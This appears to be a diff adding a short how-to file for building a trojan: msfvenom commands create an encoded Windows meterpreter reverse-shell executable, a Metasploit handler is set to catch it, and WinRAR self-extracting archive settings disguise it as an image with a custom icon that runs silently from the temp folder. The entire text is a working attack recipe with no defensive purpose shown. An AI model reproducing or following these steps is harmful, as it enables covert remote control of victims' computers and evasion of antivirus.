@@ -1,0 +1,27 @@
+msfvenom -a 86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.0.10 lport=1234 -e x86/shikata_ga_nai -i 10 -b "x00" -f exe > /var/www/html/system.exe
+msfconsole
+use multi/handler 
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.10
+set lport 1234
+exploit
+get any image and convert the image to icon(search on google to find converter)
+b3allim l icon wel payload
+right click 
+add to archive{
+
+check create sfx archive
+go to advanced
+sfx options
+path to extract
+%temp%
+setup
+anime.jpg
+system.exe
+go to modes
+check hide all
+go to text and icon
+browse anime.ico
+go to update
+check overwrite all files
+press ok
